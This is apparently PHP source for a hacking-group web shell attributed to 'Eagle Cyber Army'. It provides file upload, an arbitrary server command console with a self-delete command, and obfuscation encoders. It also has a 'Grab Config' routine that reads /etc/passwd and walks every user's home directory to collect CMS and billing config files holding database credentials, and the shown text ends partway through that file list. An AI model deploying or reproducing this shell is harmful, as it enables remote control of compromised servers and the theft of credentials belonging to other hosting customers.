$txt_icon = 'iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAACHElEQVQ4T2NkoDJgRDOPH8hXAGIBHPawAcVfA/ETIH4PxH/R1aEbqP/y5csLuBx99uxZBk9PT4akpKTS+fPnLwCqewvE/5HVoxto/+rVqwO4DDxz5gzYQBDQ1dUNv3Llyi4g8yOyoRgGvnnzBqeBx44dY/D19YXbZ2Rk5H/+/Pm9QIGvMEEMA9++fYvTQKCLGOzs7FA8wMjIqAoUuIPTwPfv3+M08NOnTwyPHj1i+PjxIwMbGyh+GBjc3NwcgRRcD4YLP3z4gNNAbGErICDgABQ/iNOFQNtJMpCfnx+HgcVn/jMy/MMVwXjF/zMwMTD0moB9i/Ay0MDZEaoMKSZ8cM1zznwC80E0CMDY6GpSV9zGbuCkYCWG229/MUzyEWfI2/ISbjCIDwLoYiC+qjAbQ97ae9gN7PSVZ7jx+ifDvBBphqQ1T+EGgvgggC4G4muIsjOUb36I3cAGDxmGqy9/MKyKlmcIWwpUBAUgPgigi4H42uIcDA07gFkbWxiWO0mCNXZ4STFUbHtGNLtz33PsBpIVxTBNGC6ESNj/+fPnACkGs7CwOADVoyZsMzMztX///kkBSxq9Bw8eTCTFQAUFhXwxMbFLTExMz06dOnULnA6NjY0lgZlc/cePH8pfv36V//XrFxcxhgLz8zdubu6HHBwcd////38TWF4+R8/LYHNAFoDov3//sgNtFkY2HOiTt8zMzD9BYiAD0C0GAI9a4RVM/R6JAAAAAElFTkSuQmCC';
// ETC Icon
$etc_icon = 'iVBORw0KGgoAAAANSUhEUgAAABYAAAAWCAYAAADEtGw7AAAC60lEQVRIS7WVTUwTQRTH/91+LBRNFEyMwYNGxQMkmlSIsS2giZ70BJh48OBHPKGNwXDo2RPee/KCH4kxazCKn9xssOHgweAFTCWCFYQQiO12u7vdXecNu83adoli3M1kZnbe/ub/3r5568N/unxV3ANsfvQf95pm789Wg/vK5bKkl8vw0e2sskG1obPofi4IAmKx2PVMJpOqARdkWcrn8yAjHwM6PY15I3fcY3tOXSgUwsne3vpguViUCoXCb0DBAdm9FzgYDKK3p6c+uMjADF6j1g3nYC7cdtjuA4EAerq764MVReHgSigI4oTFrdgFdjbw+/2Ix+Me4FJJYvANxTa0otbewFFbUWynEYnxBJcIXCpVoMiuwPq6itCZDsAwoYy8RtON09CnFxBobYZ//65Kdm6aFQQuqSp8pgXz5TTK6c8Q+48hFGuDlVuH8uA9tifPQc9koTz9gNCJQ2g4ewS+gJ976ZluqqpKrEEbeQNhmwhxoBP+vc3cAy09CyO7jKbL3Vyl8W0NxcdTMNdk7Ljdz8HRaLR+jAmsaRpU5jKBG853cZfpUkYnIbTuRCMLC0GM7+uQ70/CWM2j+c4FbuMJZlAOplDorz5BfzeDxv5OiCwUP5MSmi7FETy8B2p6BoXRNBpOtSM80AUEBJ5Jm4J1XecpRu6bX1Zg0sc7fhBrg/fQcvcKBDEI5cVHCPtaILTthmmasCwLPI+9Doim65LOFNPuNcfZyWOKr2GABFCjMcGZvRqJRK7Ozc09rKkVzFAi42rwRknYqBcEonDJsoxcLgdRFMGKlzU+Pv4omUwmmOnKH4MdKG1AUJaWmJ9fQEdHO7LZLMbGxp4NDw9fY8s/uIiq2ttHitnunmEglykd6XQuLi4iHA6DKZ1IJBIXHeiWwBQGArNihaWlJevtxMTzW0NDFaWO0BrF7EWJVLldd2oC9fT1ySMG1lKp1BMW05tupV7gv/k1aQwyxdpyVTj5tOaPU89oK89+Af5thD+QE4DsAAAAAElFTkSuQmCC';
// JS / VBS Icon
$js_icon = 'iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAACGElEQVQ4T2NkoDJgRDOPH8hXAGIBHPawAcVfA/ETIH4PxH/R1aEbqP/y5csLuBx99uxZBk9PT4akpKTS+fPnLwCqewvE/5HVoxto/+rVqwO4DDxz5gzYQBDQ1dUNv3Llyi4g8yOyoRgGvnnzBqeBx44dY/D19YXbZ2Rk5H/+/Pm9QIGvMEEMA9++fYvTQKCLGOzs7FA8wMjIqAoUuIPTwPfv3+M08NOnTwyPHj1i+PjxIwMbGyh+GBjc3NwcgRRcD4YLP3z4gNNAbGErICDgABQ/iNOFQNtJMpCfnx+HgcVn/jMy/MMVwXjF/zMwMTD0moB9i/Ay0MDZEaDwRYAUEz44Z86ZT2A2TAzGB4mlrriN3cBJwUoMt9/+QjF0ko84Q96Wl2AxZDZMkaowG0Pe2nvYDez0lWe48fonioHzQqQZktY8hYuh8zVE2RnKNz/EbmCDhwzD1Zc/UAxcFS3PELYUqAEJIItpi3MwNOwAZm1sYVjuJImiscNLiqFi2zO4GIgPAshiIH7nvufYDSQrimGaMFwIkbD/8+fPAVIMZmFhcQCqR03YZmZmav/+/ZMCljR6Dx48mEiKgQoKCvliYmKXmJiYnp06deoWOB0aGxtLAjO5+o8fP5S/fv0q/+vXLy5iDAXm52/c3NwPOTg47v7///8msLx8jp6XweaALADRf//+ZQfaLIxsONAnb5mZmcFpC2QAusUAvcTMFcmmXNcAAAAASUVORK5CYII=';
// .HTACCESS Icon
$ht_icon = 'R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP8AAP8A/wAAgIAAgP//AAAAAAAAAAM6WEXW/k6RAGsjmFoYgNBbEwjDB25dGZzVCKgsR8LhSnprPQ406pafmkDwUumIvJBoRAAAlEuDEwpJAAA7';
// Archive Icon
$zip_icon = 'iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAABe0lEQVQ4T2NkgAItLWUVWX3OWhY2pt8wMXT668c/Tw5suNYMFP+LSw0jTEJbT9kpokFxr5AUOy61DNdOvf1zYN7bm1cv3NYDKvqHTSFJBr5/+YNhQ8er/0xsjIdPHbzkiM1Qkg3c2veegZ2Jj+Hbv3eHsBlKloFcrEIMf//+wWooyQbunf+a4c/3/+Dg+/Xr3//vn38eu3Tmjg0sPIk2kJddnOHTt7cMP3/9RImL+xc+/jm45K3u5bO3boAkiDYwy3wLw8brlQxPP11GMfDVgx8MazseWF+5cPcYUQaK82gwuKmUMWwAGvbt93uGv/9+UWYgF6sgg5yAMYM0ny7DuWerGd5/fzLIDKS6l2H+o1qksDNzM4hwKzFwAsMSFMPfgRGDDEiOZVBk+Gu2g82gSrLhY5dgiNKfATZw6cV0hs8/X1LmQpBuPmAuAWU2dMNAciR7GWfhCJWgn4G6umpKsoacNSwsjDirAGyu/fPzP9vDC5/rr1699wgkDwCg1Dwkc6n7zAAAAABJRU5ErkJggg==';
// Unknow Icon
$unknown_icon = 'iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAEWUlEQVQ4T4WUe2xTdRTHv/f2ebuur726FWZbNgsZkCi+RQlBo1v2hA0IbMtgBv5RRAniRiKgcWggIBCzBJxsM0QzUOg2tkCEiNEYNUEhsHWvduxlx9ZubW/b9fZxvffKlk6Gnr9+ued3Puf8zjn3S+B/zLLdmsgwyCDIKEsFI2N3z2+k/yuEWMiZuaVdK5ER7yZqk7fJKaVBLJEK1yJMCEG/b9jvm26I+Xyf2c9v9Pw7/iGgeXvbVm3yojO6lAyKZVmEgjSkZATcEWFWDC4BQBBw3x/xuyfHqhxnCy7EQ+cBH3+j84A+03JQKqOQJPFg8wsarMnRQauUCDEuH4Mbd9z45hcPpiJqLpkf48N9tb0NuYdnoXNAc1XrFoNx2TkR97zC5Sx25WdCRBKw/RXB7ZEwojEgK1WMp4wS7szieNsQLt8lEGZm4LzXU2pvKvyWhwpAvmc6fdqoJimNKlrB4m0OxsXg2BUa17pD3A1WeDJvyxeJ8VGJGnIJgaOX7qGzi8C0y0nT912G/nN5XgGYVd1xKMO47IP0BAZfvZUFkqvs8p8BnLjqgSlFjA836CDm+na4zY1bwyFUr1Fj83NKRKIsyk/2YdwvxojDtt/RmF8nAHPevDGiSzEY9ryuQt6qZKGSOusErt+hUbdJj2ezKaHC9pteHO+YxKsrlagpShW+WX+bxIkrHn5Ijq76tWaC3zOFRu/lp2d9LxsqhVgAjrgY3B4KoGCVRuiZNxDFO01DGHDOoLYkA689oRaALm8Y64/1Y4b2sh5Pj4IwlVstujSDTa2i0F6zdMGddfnC2N1gx+BEEIVPJ2H/hsfARLgpPbDcum54fQG4nMNLBKAmVW/TqpVofT8O+GAIfMzuL2z4vc+DTav12FtiEmBxbuTVdcHrpTHlmjATOWUtSlKf7pMrVLi0bykSKdG8KvnGv7TvJ6Rr5Og49AxCYW7icTfcdARlR2wI0tMsHXAohKFYdnw/pFRpF9eUGrmGq4Xrs0F8nz5t6cZKkxrFzxvAcAnirfMPD45ctIP2Ttp7T+cuEYDmyrYDKl3KwezFGtTvMAsLPQvlgSe/64ZMSmJnvoX/6+Yswg1rZ/0ABkanQE+5auzNBZ8IbmPVRY1MrBiVK1WKinUmbFubNBc0HWCwbs9VAfTrqTyQIvIfH5fozLVJfH3djmDQ5yOjIUPPl0W+uXymKmuZnEpskUrlKH/FjIqXdXOV/njLCaVchNUr0uAPRYU1avzBzcEGwIRmMBMMFA82F1r5PPPEwVTZWiuTUx/zcmUxpqH0xVQ8aaSgSRAJFbroKG46grjw8zh6B52IhMNgmMBeR1Px0dknPSRfpsq2UkKERolEmkCSYkjlFJQKGbfEBPyBEJiZAGKxMCcKEV+MZSoGm9cLlT0SyDuytnaoomR4FwGimhATRgJ833iBiLGxKOtgCfZ0QpD5fCH1XlCx4zMaq87KY4wqgxBJWIlGPNZ/Ko+Xn0fa34Uz1Qi6lVqKAAAAAElFTkSuQmCC';

// Upload File
if(isset($_GET['upload'])){
	 if(isset($_POST['upload'])){
         if(is_uploaded_file($_FILES['file']['tmp_name'])){
        $path = sulap($_POST['path']);
        $fname = $_FILES['file']['name'];
        $tmp_name = $_FILES['file']['tmp_name'];
        $pindah = $path.'/'.$fname;
        $stat = @move_uploaded_file($tmp_name,$pindah);     
        if ($stat) {
            $result = "<center><font color='lime'><strong>Uploaded!</strong></font> at $pindah</center>";
        }
        else $result = "<center><font color='red'><strong>Denied!</strong></font></center>";
    }
    else $result = "<center><font color='red'><strong>Denied!</strong></font></center>";
    }
    echo $result;
				echo "<center>
	<form method='post' enctype='multipart/form-data'>
    <b>Target Directory:</b><br>
    <input type=\"text\" name=\"path\" value=".$dir." autocomplete='off'/><br>
    <input type=\"file\" name='file'/>
	<input type='submit' value='Upload' name='upload'>
	</form></center>";
}
// Command Execute
elseif(isset($_GET['command'])){
echo "<br><fieldset>";
	echo "<form method='post'>
<b>Command : </b>
<input autocomplete='off' type='text' size='30' height='10' name='command'> <input type='submit' name='hatedoncmd' value='>>'>
	</form>	";
	echo'<br><div style="background:gray;margin:0px;padding:1px;text-align:left;color:white;"><pre>';
	if(!isset($_POST['command'])){
	echo "Welcome to ECA Command Execution Tools<br>Type '--info' for more information";
}
	if(isset($_POST['hatedoncmd']))
{
$cmd = $_POST['command'];
if(empty($cmd))
{
echo "Please Insert Command!";
 }
elseif(preg_match("/^suicide$/", $cmd)) {
unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
@unlink(__FILE__);
print "<script>window.location='/';</script>";
}
elseif(preg_match("/^--fb$/", $cmd)) {
print "<script>window.location='https://www.facebook.com/EagleCyberArmy/';</script>";
}
elseif(preg_match("/^--blog$/", $cmd)) {
print "<script>window.location='www.ecateam.com/';</script>";
}
elseif(preg_match("/^--author -fp$/", $cmd)) {
print "<script>window.location='https://www.facebook.com/hiddencoder.id';</script>";
}
elseif(preg_match("/^--author -web$/", $cmd)) {
print "<script>window.location='http://hiddencoder.tech/';</script>";
}
elseif(preg_match("/^--php_info$/", $cmd)) {
print "<script>window.location='?php_info&dir=$dir';</script>";
}
elseif(preg_match("/^--info$/", $cmd)) {
print "Command Execution Tool Recode by HiddenCoder

For more information on a specific command, type HELP command-name

This is Custom Command line
>> --info = View more information
>> suicide = Remove shell from server
>> --fb = Visit my Facebook profile
>> --blog = Visit my Blog
>> --eca -web = Visit ECA Official Website
>> --eca -fp = Visit ECA Facebook Page
>> --php_info = View PHP Information
";
}
elseif(!exe($cmd)){
	echo "'$cmd' is not internal or external command / command functions is disable";
}
elseif(isset($cmd))
 {
 $output = exe($cmd);
 echo $output; }
}
echo'</pre></div><br><br>';
echo "</fieldset>";
}
elseif(isset($_GET['hash_tools'])){
if($_GET['hash_tools'] == 'id'){
?>
<center><h1 style="font-size:33px;">Hash Identification</h1><br>
<?php
}elseif($_GET['hash_tools'] == 'text') {
?>
<center><h1 style="font-size:33px;">Text Conversions</h1><br>
<?php
}elseif($_GET['hash_tools'] == 'ende') {
?>
<center><h1 style="font-size:33px;">Encode & Decode</h1><br>
<?php
}else{
?>
<center><h1 style="font-size:33px;">Hash Tools</h1><br>
<?php
}
echo"
<br>
<hr width='100%' style='position:absolute;top:368px;'><div class='fitur' style='position:relative;'>
<ul>
<li>
<a href='?hash_tools=id'>Hash Identification</a>
</li>
<li>
<a href='?hash_tools=ende'>Encode & Decode</a>
</li>
<li>
<a href='?hash_tools=text'>Text Conversions</a>
</li>
</ul>
</div>
</center>
<br><br>";
// Hash Identification
if($_GET['hash_tools'] == 'id'){
	if (isset($_POST['gethash'])) {
        $hash = $_POST['hash'];
        if (strlen($hash) == 32) {
            $hashresult = "MD5 Hash";
        } elseif (strlen($hash) == 40) {
            $hashresult = "SHA-1 Hash/ /MySQL5 Hash";
        } elseif (strlen($hash) == 13) {
            $hashresult = "DES(Unix) Hash";
        } elseif (strlen($hash) == 16) {
            $hashresult = "MySQL Hash / /DES(Oracle Hash)";
        } elseif (strlen($hash) == 41) {
            $GetHashChar = substr($hash, 40);
            if ($GetHashChar == "*") {
                $hashresult = "MySQL5 Hash";
            }
        } elseif (strlen($hash) == 64) {
            $hashresult = "SHA-256 Hash";
        } elseif (strlen($hash) == 96) {
            $hashresult = "SHA-384 Hash";
        } elseif (strlen($hash) == 128) {
            $hashresult = "SHA-512 Hash";
        } elseif (strlen($hash) == 34) {
            if (strstr($hash, '$1$')) {
                $hashresult = "MD5(Unix) Hash";
            }
        } elseif (strlen($hash) == 37) {
            if (strstr($hash, '$apr1$')) {
                $hashresult = "MD5(APR) Hash";
            }
        } elseif (strlen($hash) == 34) {
            if (strstr($hash, '$H$')) {
                $hashresult = "MD5(phpBB3) Hash";
            }
        } elseif (strlen($hash) == 34) {
            if (strstr($hash, '$P$')) {
                $hashresult = "MD5(Wordpress) Hash";
            }
        } elseif (strlen($hash) == 39) {
            if (strstr($hash, '$5$')) {
                $hashresult = "SHA-256(Unix) Hash";
            }
        } elseif (strlen($hash) == 39) {
            if (strstr($hash, '$6$')) {
                $hashresult = "SHA-512(Unix) Hash";
            }
        } elseif (strlen($hash) == 24) {
            if (strstr($hash, '==')) {
                $hashresult = "MD5(Base-64) Hash";
            }
        } else {
            $hashresult = "<font color='red'>Hash type not found</font>";
        }
    } else {
        $hashresult = "<font color='yellow'>No Hash Entered</font>";
    }
?>
	<center>
	
		<form action="" method="POST">
		<b>Enter Hash</b>:<br>
		<input type="text" autocomplete='off' name="hash" size="50" required /><br>
		<input type="submit" name="gethash" value="Identify Hash" style="width: 430px;"/><br><br>
		<b>Result: <?php echo "<font color='lime'>".$hashresult."</font>" ?></b></form>
	</center>
<?php
}
elseif($_GET['hash_tools'] == 'text') {
$submit= $_POST['enter'];
if (isset($submit)) {
$akbar = ($_POST['tng199x']);
$pass = $_POST['password']; // password
$salt = '}#f4ga~g%7hjg4&j(7mk?/!bj30ab-wi=6^7-$^R9F|GK5J#E6WT;IO[JN'; // random string
switch ($akbar) {case 'pilih': $ea='';
break;case 'md5': $ea=md5($pass); // md5 hash #1
break;case 'md4' : $ea=hash("md4",$pass);
break;case 'md5salt' : $ea=md5($salt.$pass); // md5 hash with salt #2
break;case 'md5saltsha1' : $ea=md5(sha1($salt.$pass)); // md5 hash with salt & sha1 #3
break;case 'sha1' : $ea=sha1($pass); // sha1 hash #4
//break;case 'sha265' : $ea=hash("sha256",$text);
break;case 'sha1salt' : $ea=sha1($salt.$pass); // sha1 hash with salt #5
break;case 'sha1saltmd5' : $ea=sha1(md5($salt.$pass)); // sha1 hash with salt & md5 #6
break;default:break;}
$hasil = htmlentities(stripslashes($ea));
}
echo '<center><form action="" method="post">';
echo '<input type="text" autocomplete=\'off\' name="password" required size=50 placeholder="Enter Your Text Here" /><br>';
echo '<select name="tng199x" style="width:427px;">';
echo '<option value="pilih">Select Type Convert</option>';
echo '<option value="md5">MD5</option>';
echo '<option value="md4">MD4</option>';
echo '<option value="md5salt">MD5 with Salt</option>';
echo '<option value="md5saltsha1">MD5 with Salt & Sha1</option>';
echo '<option value="sha1">Sha1</option>';
//echo '<option value="sha256">Sha256</option>';
echo '<option value="sha1salt">Sha1 with Salt</option>';
echo '<option value="sha1saltmd5">Sha1 with Salt & MD5</option>';
echo '</select><br>';
echo '<input placeholder="Result Convert" type=text size=50 readonly value='.$hasil.'></center><br>';
echo '<center><input type="submit" name="enter" style="width: 430px;" value="Convert" /></center>';
echo '</form>'; 
}
elseif($_GET['hash_tools'] == 'ende'){
	?>
	<form method="post">
<textarea class="form-control" cols="80" rows="10" name="beat" required></textarea><br>
<center>
<select style="width: 725px;" name="type">
<option value="base64">Base64</option>
<option value="urlencode">URL</option>
<option value="ur">convert_uu</option>
<option value="json">json</option>
<option value="gzinflates">gzinflate - base64</option>
<option value="str2">str_rot13 - base64</option>
<option value="gzinflate">str_rot13 - gzinflate - base64</option>
<option value="gzinflater">gzinflate - str_rot13 - base64</option>
<option value="gzinflatex">gzinflate - str_rot13 - gzinflate - base64</option>
<option value="gzinflatew">str_rot13-convert_uu-url-gzinflate-str_rot13-base64-convert_uu-gzinflate-url-str_rot13-gzinflate-base64</option>

<option value="str">str_rot13 - gzinflate - str_rot13 - base64</option>
<option value="url">base64 - gzinflate - str_rot13 - convert_uu - gzinflate - base64</option>
</select>
</center>
<br>
<hr width='100%' style='position:absolute;top:873px;'><div class='fitur' style='position:relative;'>
<center>
<input class='btn-primary' type='submit' name='encode' value='Encode' style="width: 150px">
<input class='btn-primary' type='submit' name='decode' value='Decode' style="width: 150px">
</center>
</div>
<br>
</form>
<?php 
$text = $_POST['beat'];
$submit = $_POST['encode'];
if (isset($submit)){
$sayang = $_POST["type"];
switch ($sayang) {case 'base64': $cinta=base64_encode($text);
break;case 'str' : $cinta=(base64_encode(str_rot13(gzdeflate(str_rot13($text)))));
break;case 'json' : $cinta=json_encode(utf8_encode($text));
break;case 'gzinflate' : $cinta=base64_encode(gzdeflate(str_rot13($text)));
break;case 'gzinflater' : $cinta=base64_encode(str_rot13(gzdeflate($text)));
break;case 'gzinflatex' : $cinta=base64_encode(gzdeflate(str_rot13(gzdeflate($text))));
break;case 'gzinflatew' : $cinta=base64_encode(gzdeflate(str_rot13(rawurlencode(gzdeflate(convert_uuencode(base64_encode(str_rot13(gzdeflate(convert_uuencode(rawurldecode(str_rot13($text))))))))))));
break;case 'gzinflates' : $cinta=base64_encode(gzdeflate($text));
break;case 'str2' : $cinta=base64_encode(str_rot13($text));
break;case 'urlencode' : $cinta=rawurlencode($text);
break;case 'ur' : $cinta=convert_uuencode($text);
break;case 'url' : $cinta=base64_encode(gzdeflate(convert_uuencode(str_rot13(gzdeflate(base64_encode($text))))));
break;default:break;}}

$submit = $_POST['decode'];
if (isset($submit)){
$op = $_POST["type"];
switch ($op) {case 'base64': $cinta=base64_decode($text);
break;case 'str' : $cinta=str_rot13(gzinflate(str_rot13(base64_decode(($text)))));
break;case 'json' : $cinta=utf8_dencode(json_dencode($text));
break;case 'gzinflate' : $cinta=str_rot13(gzinflate(base64_decode($text)));
break;case 'gzinflater' : $cinta=gzinflate(str_rot13(base64_decode($text)));
break;case 'gzinflatex' : $cinta=gzinflate(str_rot13(gzinflate(base64_decode($text))));
break;case 'gzinflatew' : $cinta=str_rot13(rawurldecode(convert_uudecode(gzinflate(str_rot13(base64_decode(convert_uudecode(gzinflate(rawurldecode(str_rot13(gzinflate(base64_decode($text))))))))))));
break;case 'gzinflates' : $cinta=gzinflate(base64_decode($text));
break;case 'str2' : $cinta=str_rot13(base64_decode($text));
break;case 'urlencode' : $cinta=rawurldecode($text);
break;case 'ur' : $cinta=convert_uudecode($text);
break;case 'url' : $cinta=base64_decode(gzinflate(str_rot13(convert_uudecode(gzinflate(base64_decode(($text)))))));
break;default:break;}}
$bee = htmlentities(stripslashes($cinta));
?>
<textarea class="form-control" cols="80" rows="10" readonly><?php echo $bee ?></textarea>
</div>
</div>
</div>
<?php
}
}
// Domains Views
elseif(isset($_GET['view_domains'])) {
	echo "<center><h1>Domains and Users</h1>";
	$d0mains = @file("/etc/named.conf");
	if(!$d0mains){
		die("<center><font color='red'>Error : can't read [ /etc/named.conf ]</font></center>");
	}
	echo '<table id="output"><tr>
			<th>Domains</th>
			<th>Users</th>
			</tr>';
	foreach($d0mains as $d0main){
		if(preg_match("#zone#mi",$d0main)){
			preg_match_all('#zone "(.*)"#', $d0main, $domains);
			flush();
			if(strlen(trim($domains[1][0])) > 2){
				$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
				echo "<tr><td><a href=http://www.".$domains[1][0]."/>".$domains[1][0]."</a></td><td>".$user['name']."</td></tr>";
				flush();}
			}
		}
		echo'</center>';
}
// Grab Config
elseif(isset($_GET['config'])){
if($_GET['config'] == 'grab'){
?>
<center><h1 style="font-size:33px;">Grab Config</h1><br>
<?php
}elseif($_GET['config'] == 'vhosts') {
?>
<center><h1 style="font-size:33px;">Grab Config Vhost</h1><br>
<?php
}else{
?>
<center><h1 style="font-size:33px;">Config Tools</h1><br>
<?php
}
echo"
<br>
<hr width='100%' style='position:absolute;top:368px;'><div class='fitur' style='position:relative;'>
<ul>
<li>
<a href='?config=grab&dir=$dir'>Grab Config</a>
</li>
<li>
<a href='?config=vhosts&dir=$dir'>Grab Config Vhosts</a>
</li>
</ul>
</div>
</center>
<br><br>";
if($_GET['config'] == 'grab'){
	if(!is_readable($dir)) {
	die("<center><h2><font color=red>Failed!</font> Directory $dir is not readable!</h2></center>");
	}
	$etc = fopen("/etc/passwd", "r") or die("<center><h2><font color=red>Error : can't read [ /etc/passwd ]</font></h2></center>");
	$idx = mkdir("eca_config", 0755);
	$isi_htc = "Options allnDirectoryIndex eca.htmnSatisfy Any";
	$htc = fopen("eca_config/.htaccess","w");
	fwrite($htc, $isi_htc);
	while($passwd = fgets($etc)) {
		if(empty($passwd) || !$etc) {
			echo "<center><font color=red>Error : can't read [ /etc/passwd ]</font></center>";
		} else {
			preg_match_all('/(.*?):x:/', $passwd, $user_config);
			foreach($user_config[1] as $eca_user) {
				$user_config_dir = "/home/$eca_user/public_html";
				if(is_readable($user_config_dir)) {
					$grab_config = ["/home/$eca_user/.accesshash" => "WHM-accesshash", "$eca_user/config/koneksi.php" => "Lokomedia", "$eca_user/forum/config.php" => "phpBB", "$eca_user/sites/default/settings.php" => "Drupal", "$eca_user/config/settings.inc.php" => "PrestaShop", "$eca_user/app/etc/local.xml" => "Magento", "$eca_user/admin/config.php" => "OpenCart", "$eca_user/application/config/database.php" => "Ellislab", "$eca_user/vb/includes/config.php" => "Vbulletin", "$eca_user/includes/config.php" => "Vbulletin", "$eca_user/forum/includes/config.php" => "Vbulletin", "$eca_user/forums/includes/config.php" => "Vbulletin", "$eca_user/cc/includes/config.php" => "Vbulletin", "$eca_user/inc/config.php" => "MyBB", "$eca_user/includes/configure.php" => "OsCommerce", "$eca_user/shop/includes/configure.php" => "OsCommerce", "$eca_user/os/includes/configure.php" => "OsCommerce", "$eca_user/oscom/includes/configure.php" => "OsCommerce", "$eca_user/products/includes/configure.php" => "OsCommerce", "$eca_user/cart/includes/configure.php" => "OsCommerce", "$eca_user/inc/conf_global.php" => "IPB", "$eca_user/wp-config.php" => "Wordpress", "$eca_user/wp/test/wp-config.php" => "Wordpress", "$eca_user/blog/wp-config.php" => "Wordpress", "$eca_user/beta/wp-config.php" => "Wordpress", "$eca_user/portal/wp-config.php" => "Wordpress", "$eca_user/site/wp-config.php" => "Wordpress", "$eca_user/wp/wp-config.php" => "Wordpress", "$eca_user/WP/wp-config.php" => "Wordpress", "$eca_user/news/wp-config.php" => "Wordpress", "$eca_user/wordpress/wp-config.php" => "Wordpress", "$eca_user/test/wp-config.php" => "Wordpress", "$eca_user/demo/wp-config.php" => "Wordpress", "$eca_user/home/wp-config.php" => "Wordpress", "$eca_user/v1/wp-config.php" => "Wordpress", "$eca_user/v2/wp-config.php" => "Wordpress", "$eca_user/press/wp-config.php" => "Wordpress", "$eca_user/new/wp-config.php" => "Wordpress", "$eca_user/blogs/wp-config.php" => "Wordpress", "$eca_user/configuration.php" => "Joomla", "$eca_user/blog/configuration.php" => "Joomla", "$eca_user/submitticket.php" => "^WHMCS", "$eca_user/cms/configuration.php" => "Joomla", "$eca_user/beta/configuration.php" => "Joomla", "$eca_user/portal/configuration.php" => "Joomla", "$eca_user/site/configuration.php" => "Joomla", "$eca_user/main/configuration.php" => "Joomla", "$eca_user/home/configuration.php" => "Joomla", "$eca_user/demo/configuration.php" => "Joomla", "$eca_user/test/configuration.php" => "Joomla", "$eca_user/v1/configuration.php" => "Joomla", "$eca_user/v2/configuration.php" => "Joomla", "$eca_user/joomla/configuration.php" => "Joomla", "$eca_user/new/configuration.php" => "Joomla", "$eca_user/WHMCS/submitticket.php" => "WHMCS", "$eca_user/whmcs1/submitticket.php" => "WHMCS", "$eca_user/Whmcs/submitticket.php" => "WHMCS", "$eca_user/whmcs/submitticket.php" => "WHMCS", "$eca_user/whmcs/submitticket.php" => "WHMCS", "$eca_user/WHMC/submitticket.php" => "WHMCS", "$eca_user/Whmc/submitticket.php" => "WHMCS", "$eca_user/whmc/submitticket.php" => "WHMCS", "$eca_user/WHM/submitticket.php" => "WHMCS", "$eca_user/Whm/submitticket.php" => "WHMCS", "$eca_user/whm/submitticket.php" => "WHMCS", "$eca_user/HOST/submitticket.php" => "WHMCS", "$eca_user/Host/submitticket.php" => "WHMCS", "$eca_user/host/submitticket.php" => "WHMCS", "$eca_user/SUPPORTES/submitticket.php" => "WHMCS", "$eca_user/Supportes/submitticket.php" => "WHMCS", "$eca_user/supportes/submitticket.php" => "WHMCS", "$eca_user/domains/submitticket.php" => "WHMCS", "$eca_user/domain/submitticket.php" => "WHMCS", "$eca_user/Hosting/submitticket.php" => "WHMCS", "$eca_user/HOSTING/submitticket.php" => "WHMCS", "$eca_user/hosting/submitticket.php" => "WHMCS", "$eca_user/CART/submitticket.php" => "WHMCS", "$eca_user/Cart/submitticket.php" => "WHMCS", "$eca_user/cart/submitticket.php" => "WHMCS", "$eca_user/ORDER/submitticket.php" => "WHMCS", "$eca_user/Order/submitticket.php" => "WHMCS", "$eca_user/order/submitticket.php" => "WHMCS", "$eca_user/CLIENT/submitticket.php" => "WHMCS", "$eca_user/Client/submitticket.php" => "WHMCS", "$eca_user/client/submitticket.php" => "WHMCS", "$eca_user/CLIENTAREA/submitticket.php" => "WHMCS", "$eca_user/Clientarea/submitticket.php" => "WHMCS", "$eca_user/clientarea/submitticket.php" => "WHMCS", "$eca_user/SUPPORT/submitticket.php" => "WHMCS", "$eca_user/Support/submitticket.php" => "WHMCS", "$eca_user/support/submitticket.php" => "WHMCS", "$eca_user/BILLING/submitticket.php" => "WHMCS", "$eca_user/Billing/submitticket.php" => "WHMCS", "$eca_user/billing/submitticket.php" => "WHMCS", "$eca_user/BUY/submitticket.php" => "WHMCS", "$eca_user/Buy/submitticket.php" => "WHMCS", "$eca_user/buy/submitticket.php" => "WHMCS", "$eca_user/MANAGE/submitticket.php" => "WHMCS", "$eca_user/Manage/submitticket.php" => "WHMCS", "$eca_user/manage/submitticket.php" => "WHMCS", "$eca_user/CLIENTSUPPORT/submitticket.php" => "WHMCS", "$eca_user/ClientSupport/submitticket.php" => "WHMCS", "$eca_user/Clientsupport/submitticket.php" => "WHMCS", "$eca_user/clientsupport/submitticket.php" => "WHMCS", "$eca_user/CHECKOUT/submitticket.php" => "WHMCS", "$eca_user/Checkout/submitticket.php" => "WHMCS", "$eca_user/checkout/submitticket.php" => "WHMCS", "$eca_user/BILLINGS/submitticket.php" => "WHMCS", "$eca_user/Billings/submitticket.php" => "WHMCS", "$eca_user/billings/submitticket.php" => "WHMCS", "$eca_user/BASKET/submitticket.php" => "WHMCS", "$eca_user/Basket/submitticket.php" => "WHMCS", "$eca_user/basket/submitticket.php" => "WHMCS", "$eca_user/SECURE/submitticket.php" => "WHMCS", "$eca_user/Secure/submitticket.php" => "WHMCS", "$eca_user/secure/submitticket.php" => "WHMCS", "$eca_user/SALES/submitticket.php" => "WHMCS", "$eca_user/Sales/submitticket.php" => "WHMCS", "$eca_user/sales/submitticket.php" => "WHMCS", "$eca_user/BILL/submitticket.php" => "WHMCS", "$eca_user/Bill/submitticket.php" => "WHMCS", "$eca_user/bill/submitticket.php" => "WHMCS", "$eca_user/PURCHASE/submitticket.php" => "WHMCS", "$eca_user/Purchase/submitticket.php" => "WHMCS", "$eca_user/purchase/submitticket.php" => "WHMCS", "$eca_user/ACCOUNT/submitticket.php" => "WHMCS", "$eca_user/Account/submitticket.php" => "WHMCS", "$eca_user/account/submitticket.php" => "WHMCS", "$eca_user/USER/submitticket.php" => "WHMCS", "$eca_user/User/submitticket.php" => "WHMCS", "$eca_user/user/submitticket.php" => "WHMCS", "$eca_user/CLIENTS/submitticket.php" => "WHMCS", "$eca_user/Clients/submitticket.php" => "WHMCS", "$eca_user/clients/submitticket.php" => "WHMCS", "$eca_user/BILLINGS/submitticket.php" => "WHMCS", "$eca_user/Billings/submitticket.php" => "WHMCS", "$eca_user/billings/submitticket.php" => "WHMCS", "$eca_user/MY/submitticket.php" => "WHMCS", 